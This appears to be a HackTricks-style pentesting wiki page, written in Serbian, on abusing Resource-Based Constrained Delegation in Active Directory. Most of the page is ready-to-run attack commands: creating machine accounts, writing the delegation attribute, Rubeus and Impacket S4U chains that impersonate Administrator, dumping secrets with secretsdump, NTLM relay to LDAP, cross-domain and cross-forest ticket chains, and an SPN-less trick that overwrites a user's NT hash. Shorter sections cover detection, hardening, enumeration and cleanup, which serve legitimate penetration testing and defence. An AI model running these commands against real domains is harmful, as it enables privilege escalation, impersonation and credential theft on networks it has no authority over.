# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Osnove Resource-based Constrained Delegation

Ovo je slično osnovnom [Constrained Delegation](constrained-delegation.md), ali **umesto** davanja dozvola **objektu** da **impersonate-uje bilo kog korisnika prema mašini**, Resource-based Constrain Delegation **podešava** u **objektu ko može da impersonate-uje bilo kog korisnika prema njemu**.<sup>[[12]](#references)</sup>

U ovom slučaju, ograničeni objekat će imati atribut pod nazivom _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ sa imenom korisnika koji može da impersonate-uje bilo kog drugog korisnika prema njemu.

Još jedna važna razlika između ovog Constrained Delegation-a i drugih delegacija jeste to što svaki korisnik sa **write dozvolama nad machine account-om** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) može da podesi **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (kod drugih oblika Delegation-a bile su potrebne domain admin privilegije).<sup>[[1]](#references)</sup>

### Novi koncepti

Kod Constrained Delegation-a je ranije navedeno da je **`TrustedToAuthForDelegation`** zastavica unutar vrednosti _userAccountControl_ korisnika potrebna za izvršavanje **S4U2Self**. Međutim, to nije potpuno tačno.\
U stvarnosti, čak i bez te vrednosti možete izvršiti **S4U2Self** prema bilo kom korisniku ako ste **service** (imate SPN), ali ako **imate `TrustedToAuthForDelegation`**, vraćeni TGS će biti **Forwardable**, a ako tu zastavicu **nemate**, vraćeni TGS neće biti **Forwardable**.<sup>[[5]](#references)</sup>

Međutim, ako **TGS** korišćen u **S4U2Proxy** nije **Forwardable**, pokušaj zloupotrebe **basic Constrain Delegation** neće raditi. Ali ako pokušavate da iskoristite **Resource-Based constrain delegation**, radiće.<sup>[[1]](#references)[[2]](#references)</sup>

### Struktura napada

> Ako imate **write equivalent privilegije** nad nalogom **Computer**, možete dobiti **privilegovan pristup** toj mašini.

Pretpostavimo da napadač već ima **write equivalent privilegije nad kompromitovanim computer-om**.

1. Napadač **kompromituje** nalog koji ima **SPN** ili ga **kreira** („Service A“). Imajte na umu da bilo koji _Admin User_ bez drugih posebnih privilegija može da kreira do 10 Computer objekata (**_MachineAccountQuota_**) i da im podesi **SPN**. Dakle, napadač može jednostavno da kreira Computer objekat i podesi SPN.
2. Napadač **zloupotrebljava svoju WRITE privilegiju** nad kompromitovanim računarom (ServiceB) da podesi **resource-based constrained delegation**, tako da dozvoli ServiceA da impersonate-uje bilo kog korisnika prema tom kompromitovanom računaru (ServiceB).
3. Napadač koristi Rubeus za izvršavanje **potpunog S4U napada** (S4U2Self i S4U2Proxy) od Service A ka Service B za korisnika koji ima **privilegovan pristup Service B-u**.
1. S4U2Self (sa SPN kompromitovanog/kreiranog naloga): Zatražiti **TGS Administratora prema meni** (nije Forwardable).
2. S4U2Proxy: Iskoristiti **ne-Forwardable TGS** iz prethodnog koraka da se zatraži **TGS** od **Administratora** prema **kompromitovanom host-u**.
3. Čak i ako koristite ne-Forwardable TGS, pošto iskorišćavate Resource-based constrained delegation, to će raditi.
4. Napadač može da izvrši **pass-the-ticket** i **impersonate-uje** korisnika kako bi dobio **pristup ServiceB-u**.<sup>[[1]](#references)</sup>

Da biste proverili _**MachineAccountQuota**_ domena, možete koristiti:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Napad

### Kreiranje objekta računara

Možete kreirati objekat računara unutar domena koristeći **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurisanje delegiranja zasnovanog na resursima sa ograničenjima

**Korišćenje activedirectory PowerShell modula**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Korišćenje PowerView-a**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Izvođenje kompletnog S4U napada (Windows/Rubeus)

Pre svega, kreirali smo novi Computer objekat sa lozinkom `123456`, pa nam je potreban hash te lozinke:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Ovo će ispisati RC4 i AES hash vrednosti za taj nalog.\
Sada se napad može izvršiti:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Možete generisati dodatne tickets za više servisa samo jednim zahtevom koristeći parametar `/altservice` alata Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Imajte na umu da korisnici imaju atribut pod nazivom "**Cannot be delegated**". Ako je ovaj atribut kod korisnika postavljen na True, nećete moći da se predstavljate kao on. Ovo svojstvo se može videti unutar BloodHound-a.

### Linux alati: RBCD od početka do kraja pomoću Impacket-a (2024+)

Ako radite iz Linux-a, možete izvršiti čitav RBCD lanac pomoću zvaničnih Impacket alata:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Beleške
- Ako je LDAP signing/LDAPS enforced, koristite `impacket-rbcd -use-ldaps ...`.
- Prednost dajte AES keys; mnogi moderni domeni ograničavaju RC4. Impacket i Rubeus podržavaju flow-ove koji koriste samo AES.
- Impacket može da prepiše `sname` ("AnySPN") za neke alate, ali kad god je moguće pribavite ispravan SPN (npr. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD među domenima i šumama

Ako se **delegating principal** koji kontrolišete nalazi u **drugom domenu** (ili čak u **drugoj šumi**) u odnosu na **resource computer**, zloupotreba je i dalje **RBCD**, ali ticket flow više nije uobičajeni single-domain `S4U2Self -> S4U2Proxy`.

### RBCD među domenima: konfigurisanje foreign principal-a pomoću SID-a

Kada podešavate `msDS-AllowedToActOnBehalfOfOtherIdentity` iz **drugog domena**, strani machine/user možda **neće moći da se razreši po imenu** u LDAP-u ciljnog domena. U tom slučaju, konfigurišite delegation entry koristeći **SID** stranog principal-a umesto njegovog sAMAccountName/UPN-a.

Ovo je naročito relevantno kada relay-ujete NTLM na LDAP pomoću `ntlmrelayx.py`:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Napomene:
- `--sid` govori alatu `ntlmrelayx.py` da `--escalate-user` tretira kao SID, što je potrebno kada je delegirajući nalog izvan ciljnog domena.
- Čak i ako alat ispiše `User not found in LDAP`, upis delegacije i dalje može biti uspešan jer security descriptor direktno čuva strani SID.

### Cross-domain RBCD: cross-realm S4U sekvenca

Kada se strani principal nalazi u `msDS-AllowedToActOnBehalfOfOtherIdentity`, funkcionalni cross-domain tok je:<sup>[[9]](#references)[[13]](#references)</sup>

1. Dobaviti **TGT** za delegirajući principal iz njegovog domena.
2. Zatražiti **referral TGT** za `krbtgt/<target-domain>`.
3. Zatražiti **cross-realm S4U2Self referral** za impersonated user-a na DC-u ciljnog domena.
4. Zatražiti stvarni **S4U2Self** ticket za tog user-a nazad u delegator domenu.
5. Izvršiti **S4U2Proxy** u delegator domenu da bi se dobio referral ticket za ciljni domen.
6. Izvršiti završni **S4U2Proxy** na DC-u ciljnog domena da bi se dobio service ticket za `cifs/host.target`, `host/host.target`, itd.

Zbog toga standardni Linux alati često ne uspevaju kod cross-domain RBCD:<sup>[[9]](#references)</sup>
- request **realm** možda mora da se razlikuje od realm-a TGT-a korišćenog u `TGS-REQ`
- lanac zahteva **nezavisne S4U2Proxy korake**, a ne samo `S4U2Self` ili `S4U2Self` neposredno praćen jednim `S4U2Proxy`

### Cross-domain RBCD iz Linux-a

Synacktiv je objavio Impacket `getST.py` implementaciju koja reprodukuje cross-realm sekvencu iz Linux-a eksplicitnim rukovanjem sa dva KDC-a:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
U praksi, novi argumenti su:
- `-dc-ip`: DC **delegating** domena
- `-targetdomain`: domen **resource computer** uređaja
- `-targetdc`: DC **resource** domena

### Ograničenja Cross-forest RBCD-a

Cross-forest RBCD ima važno ograničenje: **impersonated user mora pripadati istoj forest kao delegating principal**. Drugim rečima, ako je vaš kontrolisani machine account u `valhalla.local`, a ciljni resource je u `asgard.local`, uglavnom **ne možete impersonirati proizvoljne `asgard.local` korisnike** prema tom resource-u putem RBCD-a.<sup>[[9]](#references)</sup>

I dalje je moguće eksploatisati ga kada:
- je korisnik iz **delegating forest**-a **local admin** (ili na drugi način privilegovan) na resource hostu u drugoj forest
- trust dozvoljava potreban authentication path i strani SID je prihvaćen u security descriptor-u ciljnog računara

### Cross-forest RBCD protokolarne specifičnosti

Cross-forest RBCD nije samo "cross-domain plus trust". Uočeni flow uključuje dve specifičnosti koje uobičajeni alati istorijski propuštaju:<sup>[[9]](#references)</sup>

1. Dodatni **S4U2Proxy** zahtev koji postavlja **`PA-PAC-OPTIONS=branch-aware`**
2. Završni service ticket koji može biti vraćen korišćenjem **RC4**, čak i kada su zatraženi drugi etypes

Praktični flow je:

1. Dobijte TGT za delegating principal u forest A.
2. Zatražite **S4U2Self** za impersonated user-a u forest A.
3. Zatražite **S4U2Proxy** u forest A kako biste dobili referral TGT za forest B.
4. Pošaljite drugi **S4U2Proxy** u forest A **bez S4U2Self ticket-a kao additional ticket-a**, ali sa omogućenom opcijom `branch-aware`, kako biste dobili još jedan referral TGT za forest B.
5. Opcionalno zatražite normalan service ticket u forest B za delegating principal (ovaj ticket nije potreban za završnu abuse radnju).
6. Koristite referral ticket-e iz koraka 3 i 4 da zatražite završni **S4U2Proxy** ticket u forest B za impersonated forest-A korisnika prema ciljnom SPN-u.

### Cross-forest RBCD iz Linux-a

Isti Synacktiv Impacket branch dodaje `-forest` switch za ovu logiku:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Rekurzivni multi-domain RBCD (3+ domena)

U **multi-domain forestima**, i **S4U2Self** i **S4U2Proxy** mogu biti **rekurzivni**, umesto da se zaustave nakon jednog referral-a:

- **Rekurzivni S4U2Self**: prvi `S4U2Self` šalje se u **domen impersoniranog korisnika**, međukoraci između parent/child domena prolaze se pomoću normalnih `TGS-REQ` referral-a za `krbtgt/<REALM>`, a **konačni `S4U2Self`** šalje se u **sopstveni domen delegirajućeg principal-a**.
- To znači da samo **posedovanje TGT-a** za machine account može biti dovoljno za impersonaciju **administratora iz drugog domena u istom forestu** i zahtev za `cifs/host`, `host/host`, `wsman/host` itd.
- **Rekurzivni S4U2Proxy** prati trust chain na isti način: međukoraci ponovo koriste prethodnu kartu kao TGT dok zahtevaju sledeći `krbtgt/<REALM>` referral, a samo poslednji korak vraća konačnu service ticket kartu.<sup>[[10]](#references)</sup>

Praktičan primer iz istog forest-a je:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less cross-domain / cross-forest RBCD

Ako je **delegating principal korisnik bez SPN-a**, poslednji rekurzivni `S4U2Self` neuspešno se završava greškom **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Zaobilazno rešenje je da se **samo poslednji korak ponovi kao `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Kratka verzija abuse lanca:

1. Autentikujte se pomoću **NT hash-a** kako biste KDC usmerili ka **RC4-HMAC (etype 23)**.
2. Najpre zatražite **`-self -u2u`** i sačuvajte tu kartu odvojeno od kasnijeg proxy koraka.
3. Izvucite **TGT session key** pomoću `describeTicket.py`.
4. Zamenite korisnikov **NT hash** tim **session key-em** pomoću `changepasswd.py -newhashes <session_key>`.
5. Ponovo upotrebite `S4U2Self+U2U` kartu kao **`-additional-ticket`** tokom zasebnog zahteva sa **`-proxy`**.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Operativne napomene:

- Kada je **prvi trusted hop već druga forest**, prednost dajte **branch-aware** algoritmu (`getST.py ... -forest`) kako bi se ponašanje podudaralo sa izvornim ponašanjem Windows-a. Ako se do strane forest dolazi tek kasnije u lancu, rekurzivni tok koji nije branch-aware i dalje može funkcionisati.<sup>[[9]](#references)</sup>
- Na novijim **Windows Server 2022/2025** DC-ovima, forsirani RC4 može da ne uspe uz grešku **`KDC_ERR_ETYPE_NOSUPP`** zbog zastarevanja RC4; zbog toga **SPN-less RBCD** može postati nemoguć, iako klasični RBCD zasnovan na SPN-u i dalje radi sa AES-om.<sup>[[15]](#references)</sup>
- Pokrenite **`S4U2Self+U2U` pre promene hash-a/lozinke korisnika**: `SamrChangePasswordUser` ne preračunava Kerberos AES ključeve naloga, pa promena lozinke pre toga može pokvariti kasnije zahteve za ticketima.<sup>[[14]](#references)</sup>
- Impersonated nalog i dalje mora biti **delegable**: **Protected Users** i nalozi sa **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** blokiraju lanac.

## Napomene o detekciji / hardening-u

- RBCD putanje između domena/forest-a i dalje se obično kreiraju kroz **ACL abuse** ili **relay-to-LDAP**. Primenite **LDAP signing** i **LDAP channel binding** na DC-ovima kako biste prekinuli uobičajene setup putanje.
- Proverite ko može da upisuje `msDS-AllowedToActOnBehalfOfOtherIdentity` na computer objektima i razrešite sačuvane SID-ove, uključujući **foreign security principals**.
- U okruženjima sa mnogo trust-ova proverite **Selective Authentication**, **SID filtering** i da li korisnici iz strane forest imaju **local admin** privilegije na resource hostovima.

### Pristupanje

Poslednja komandna linija izvršiće **kompletan S4U napad i inject-ovati TGS** od Administrator-a ka victim hostu u **memoriji**.\
U ovom primeru zatražen je TGS za **CIFS** servis od Administrator-a, pa ćete moći da pristupite **C$**:
```bash
ls \\victim.domain.local\C$
```
### Zloupotreba različitih service tickets

Saznajte više o [**dostupnim service tickets ovde**](silver-ticket.md#available-services).

## Enumeracija, auditing i čišćenje

### Enumeracija računara sa konfigurisanom RBCD

PowerShell (dekodiranje SD-a radi razrešavanja SID-ova):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (čitanje ili pražnjenje jednom komandom):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Čišćenje / resetovanje RBCD-a

- PowerShell (brisanje atributa):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos greške

- **`KDC_ERR_ETYPE_NOTSUPP`**: Ovo znači da je Kerberos konfigurisan tako da ne koristi DES ili RC4, a vi prosleđujete samo RC4 hash. Prosledite Rubeus-u najmanje AES256 hash (ili mu jednostavno prosledite RC4, AES128 i AES256 hash-eve). Primer: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** tokom `-self` za običnog korisnika: principal koji vrši delegaciju verovatno **nema SPN**. Ponovite **poslednji hop** kao **`S4U2Self+U2U`** umesto standardnog **`S4U2Self`**.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** tokom **SPN-less RBCD**: noviji DC-ovi mogu odbiti forsiranu putanju **RC4-HMAC** koja je potrebna za trik **`S4U2Self+U2U`** + zamenu session key-a. Umesto toga pokušajte klasičnu **SPN-backed** RBCD putanju sa AES-om.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Ovo znači da se vreme na trenutnom računaru razlikuje od vremena na DC-u i da Kerberos ne radi ispravno.
- **`preauth_failed`**: Ovo znači da dati username + hash-evi ne rade za login. Možda ste zaboravili da stavite znak "$" unutar username-a prilikom generisanja hash-eva (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Ovo može značiti:
- Korisnik kog pokušavate da impersonirate ne može da pristupi željenom servisu (zato što ne možete da ga impersonirate ili zato što nema dovoljno privilegija)
- Traženi servis ne postoji (ako tražite ticket za WinRM, a WinRM nije pokrenut)
- Kreirani fakecomputer je izgubio privilegije nad ranjivim serverom i morate mu ih ponovo dodeliti.
- Zloupotrebljavate klasični KCD; imajte na umu da RBCD funkcioniše sa ne-forwardable S4U2Self ticket-ima, dok KCD zahteva forwardable ticket-e.

## Beleške, relay-i i alternative

- RBCD SD možete upisati i preko AD Web Services (ADWS) ako je LDAP filtriran. Pogledajte:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay lanci često se završavaju u RBCD-u kako bi se u jednom koraku postigao local SYSTEM. Pogledajte praktične end-to-end primere:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Ako su LDAP signing/channel binding **isključeni** i možete da kreirate machine account, alati kao što je **KrbRelayUp** mogu da relay-uju coerced Kerberos auth ka LDAP-u, postave `msDS-AllowedToActOnBehalfOfOtherIdentity` za vaš machine account na target computer object-u i odmah impersoniraju **Administrator** putem S4U-a sa off-host sistema.<sup>[[8]](#references)</sup>

## Reference

- [1] [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [2] [Another Word on Delegation](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Resource-Based Constrained Delegation Abuse](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: An Offensive Kerberos Overview](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (official)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Quick Linux cheatsheet with recent syntax](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
